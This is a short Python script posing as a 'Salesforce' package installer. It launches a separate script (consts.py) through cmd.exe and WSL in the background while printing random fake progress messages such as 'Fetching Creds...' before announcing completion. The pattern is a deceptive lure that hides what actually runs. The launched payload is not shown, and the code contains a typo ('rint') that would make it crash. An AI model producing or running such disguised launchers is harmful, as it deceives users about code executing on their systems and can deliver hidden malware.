import os
import time
import platform
import subprocess
import random
import sys

LOGS = [
    "Initializing node cluster...",
    "Fetching Creds...",
    "Patching modules...",
    "Modify hypervisor...",
    "Deploying microservices...",
    "Initiating telemetry data...",
    "Linking RPC services...",
    "Authenticating session token...",
]

def debug_prints():
    print("Connecting to server...")
    time.sleep(0.3)
    for i in range(4):
        log = random.choice(LOGS)
        print(f"[+] {log}")
        time.sleep(0.3)
    rint("Installation complete!")
    time.sleep(0.3)

print("Installing 'Salesforce' Package...}")
subprocess.Popen(["cmd.exe", "/c", "start", "wsl.exe", "python", "consts.py"])
time.sleep(1)
debug_prints()
